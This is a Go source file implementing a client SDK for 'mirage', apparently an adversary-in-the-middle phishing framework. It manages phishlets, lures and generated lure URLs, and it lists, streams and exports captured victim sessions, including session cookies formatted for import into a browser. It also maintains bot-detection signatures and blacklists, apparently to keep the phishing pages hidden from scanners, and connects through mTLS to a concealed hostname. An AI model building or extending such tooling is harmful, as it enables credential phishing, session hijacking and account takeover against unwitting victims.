package sdk

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

// Client is a typed HTTP client for the mirage management API.
// All requests are authenticated via the mutual TLS client certificate
// presented at construction time.
type Client struct {
	baseURL    string
	httpClient *http.Client
}

// NewClient constructs a Client that connects to address using mTLS.
//
// address is the server's IP/hostname and port (e.g. "https://1.2.3.4:443").
// secretHostname is used for TLS SNI and the Host header; the TCP connection
// always dials address so the operator's workstation does not need to resolve
// secretHostname via DNS.
// certPEM and keyPEM are the operator's client certificate and private key.
// caCertPEM is the CA that signed the server's certificate, used for pinning.
func NewClient(address, secretHostname string, certPEM, keyPEM, caCertPEM []byte) (*Client, error) {
	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, fmt.Errorf("sdk: loading client cert: %w", err)
	}

	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(caCertPEM) {
		return nil, fmt.Errorf("sdk: server CA cert is not valid PEM")
	}

	u, err := url.Parse(address)
	if err != nil {
		return nil, fmt.Errorf("sdk: parsing address: %w", err)
	}
	dialAddr := u.Host

	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		ServerName:   secretHostname,
		MinVersion:   tls.VersionTLS13,
	}

	transport := &http.Transport{
		TLSClientConfig: tlsCfg,
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, network, dialAddr)
		},
	}

	return &Client{
		baseURL: "https://" + secretHostname,
		httpClient: &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		},
	}, nil
}

// --- Sessions ---

func (c *Client) ListSessions(f SessionFilter) (*PaginatedResponse[SessionResponse], error) {
	q := url.Values{}
	if f.Phishlet != "" {
		q.Set("phishlet", f.Phishlet)
	}
	if f.Completed != nil {
		q.Set("completed", strconv.FormatBool(*f.Completed))
	}
	if f.Since != nil {
		q.Set("since", f.Since.Format(time.RFC3339))
	}
	if f.Until != nil {
		q.Set("until", f.Until.Format(time.RFC3339))
	}
	if f.Limit > 0 {
		q.Set("limit", strconv.Itoa(f.Limit))
	}
	if f.Offset > 0 {
		q.Set("offset", strconv.Itoa(f.Offset))
	}
	path := RouteSessions
	if len(q) > 0 {
		path += "?" + q.Encode()
	}
	return get[PaginatedResponse[SessionResponse]](c, path)
}

func (c *Client) GetSession(id string) (*SessionResponse, error) {
	return get[SessionResponse](c, ResolveRoute(RouteSession, "id", id))
}

func (c *Client) DeleteSession(id string) error {
	return discard(c, http.MethodDelete, ResolveRoute(RouteSession, "id", id), nil)
}

// ExportSessionCookies returns the captured cookies for the session as raw JSON,
// in the format expected by the StorageAce browser import extension.
func (c *Client) ExportSessionCookies(id string) ([]byte, error) {
	resp, err := c.do(http.MethodGet, ResolveRoute(RouteSessionExport, "id", id), nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if err := checkStatus(resp); err != nil {
		return nil, err
	}
	return io.ReadAll(resp.Body)
}

// StreamSessions opens a Server-Sent Events connection and delivers session
// lifecycle events (created, updated, completed, deleted) to the returned channel.
// The channel is closed when the context-level done signal fires or the server
// closes the connection. Call the returned cancel function to stop streaming.
func (c *Client) StreamSessions() (<-chan SessionEvent, func(), error) {
	req, err := http.NewRequest(http.MethodGet, c.baseURL+RouteSessionsStream, nil)
	if err != nil {
		return nil, nil, fmt.Errorf("sdk: stream request: %w", err)
	}
	req.Header.Set("Accept", "text/event-stream")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, nil, fmt.Errorf("sdk: stream connect: %w", err)
	}
	if err := checkStatus(resp); err != nil {
		resp.Body.Close()
		return nil, nil, err
	}

	ch := make(chan SessionEvent, 16)
	cancel := func() { resp.Body.Close() }

	go func() {
		defer close(ch)
		defer resp.Body.Close()

		scanner := bufio.NewScanner(resp.Body)
		var eventType, dataLine string

		for scanner.Scan() {
			line := scanner.Text()
			if et, ok := strings.CutPrefix(line, "event: "); ok {
				eventType = et
			} else if data, ok := strings.CutPrefix(line, "data: "); ok {
				dataLine = data
			} else if line == "" && dataLine != "" {
				var s SessionResponse
				if json.Unmarshal([]byte(dataLine), &s) == nil {
					ch <- SessionEvent{Type: eventType, Session: s}
				}
				eventType = ""
				dataLine = ""
			}
		}
	}()

	return ch, cancel, nil
}

// --- Lures ---

func (c *Client) ListLures() (*PaginatedResponse[LureResponse], error) {
	return get[PaginatedResponse[LureResponse]](c, RouteLures)
}

func (c *Client) CreateLure(req CreateLureRequest) (*LureResponse, error) {
	return send[LureResponse](c, http.MethodPost, RouteLures, req)
}

func (c *Client) UpdateLure(id string, req UpdateLureRequest) (*LureResponse, error) {
	return send[LureResponse](c, http.MethodPatch, ResolveRoute(RouteLure, "id", id), req)
}

func (c *Client) DeleteLure(id string) error {
	return discard(c, http.MethodDelete, ResolveRoute(RouteLure, "id", id), nil)
}

func (c *Client) GenerateLureURL(id string, req GenerateURLRequest) (*GenerateURLResponse, error) {
	return send[GenerateURLResponse](c, http.MethodPost, ResolveRoute(RouteLureURL, "id", id), req)
}

func (c *Client) PauseLure(id string, req PauseLureRequest) error {
	return discard(c, http.MethodPost, ResolveRoute(RouteLurePause, "id", id), req)
}

func (c *Client) UnpauseLure(id string) error {
	return discard(c, http.MethodDelete, ResolveRoute(RouteLurePause, "id", id), nil)
}

// --- Phishlets ---

func (c *Client) ListPhishlets() (*PaginatedResponse[PhishletResponse], error) {
	return get[PaginatedResponse[PhishletResponse]](c, RoutePhishlets)
}

func (c *Client) EnablePhishlet(name string, req EnablePhishletRequest) (*PhishletResponse, error) {
	return send[PhishletResponse](c, http.MethodPost, ResolveRoute(RoutePhishletEnable, "name", name), req)
}

func (c *Client) DisablePhishlet(name string) (*PhishletResponse, error) {
	return send[PhishletResponse](c, http.MethodPost, ResolveRoute(RoutePhishletDisable, "name", name), nil)
}

func (c *Client) HidePhishlet(name string) (*PhishletResponse, error) {
	return send[PhishletResponse](c, http.MethodPost, ResolveRoute(RoutePhishletHide, "name", name), nil)
}

func (c *Client) UnhidePhishlet(name string) (*PhishletResponse, error) {
	return send[PhishletResponse](c, http.MethodPost, ResolveRoute(RoutePhishletUnhide, "name", name), nil)
}

func (c *Client) CreateSubPhishlet(req CreateSubPhishletRequest) (*PhishletResponse, error) {
	return send[PhishletResponse](c, http.MethodPost, RoutePhishlets, req)
}

func (c *Client) DeleteSubPhishlet(name string) error {
	return discard(c, http.MethodDelete, ResolveRoute(RoutePhishlet, "name", name), nil)
}

// --- Blacklist ---

func (c *Client) ListBlacklist() (*PaginatedResponse[BlacklistEntryResponse], error) {
	return get[PaginatedResponse[BlacklistEntryResponse]](c, RouteBlacklist)
}

func (c *Client) AddBlacklistEntry(req AddBlacklistEntryRequest) (*BlacklistEntryResponse, error) {
	return send[BlacklistEntryResponse](c, http.MethodPost, RouteBlacklist, req)
}

func (c *Client) RemoveBlacklistEntry(entry string) error {
	return discard(c, http.MethodDelete, ResolveRoute(RouteBlacklistEntry, "entry", entry), nil)
}

// --- BotGuard ---

func (c *Client) ListBotSignatures() (*PaginatedResponse[BotSignatureResponse], error) {
	return get[PaginatedResponse[BotSignatureResponse]](c, RouteBotSignatures)
}

func (c *Client) AddBotSignature(req AddBotSignatureRequest) (*BotSignatureResponse, error) {
	return send[BotSignatureResponse](c, http.MethodPost, RouteBotSignatures, req)
}

func (c *Client) RemoveBotSignature(hash string) error {
	return discard(c, http.MethodDelete, ResolveRoute(RouteBotSignature, "hash", hash), nil)
}

func (c *Client) UpdateBotThreshold(req UpdateBotThresholdRequest) error {
	return discard(c, http.MethodPatch, RouteBotThreshold, req)
}

// --- System ---

func (c *Client) Status() (*StatusResponse, error) {
	return get[StatusResponse](c, RouteStatus)
}

func (c *Client) Reload() error {
	return discard(c, http.MethodPost, RouteReload, nil)
}

// --- internals ---

func (c *Client) do(method, path string, body any) (*http.Response, error) {
	var bodyReader io.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			return nil, fmt.Errorf("sdk: marshalling request: %w", err)
		}
		bodyReader = bytes.NewReader(b)
	}

	req, err := http.NewRequest(method, c.baseURL+path, bodyReader)
	if err != nil {
		return nil, fmt.Errorf("sdk: building request: %w", err)
	}

	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("sdk: %s %s: %w", method, path, err)
	}

	return resp, nil
}

func checkStatus(resp *http.Response) error {
	if resp.StatusCode < 400 {
		return nil
	}

	var e ErrorResponse
	_ = json.NewDecoder(resp.Body).Decode(&e)
	if e.Code != "" {
		return fmt.Errorf("api error %d [%s]: %s", resp.StatusCode, e.Code, e.Error)
	}

	return fmt.Errorf("api error %d", resp.StatusCode)
}

// get performs a GET and decodes the JSON response into T.
func get[T any](c *Client, path string) (*T, error) {
	resp, err := c.do(http.MethodGet, path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if err := checkStatus(resp); err != nil {
		return nil, err
	}

	var result T
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("sdk: decoding response: %w", err)
	}

	return &result, nil
}

// send performs a request with a JSON body and decodes the JSON response into T.
func send[T any](c *Client, method, path string, body any) (*T, error) {
	resp, err := c.do(method, path, body)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if err := checkStatus(resp); err != nil {
		return nil, err
	}

	var result T
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("sdk: decoding response: %w", err)
	}

	return &result, nil
}

// discard performs a request and discards the response body, returning any API error.
func discard(c *Client, method, path string, body any) error {
	resp, err := c.do(method, path, body)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return checkStatus(resp)
}
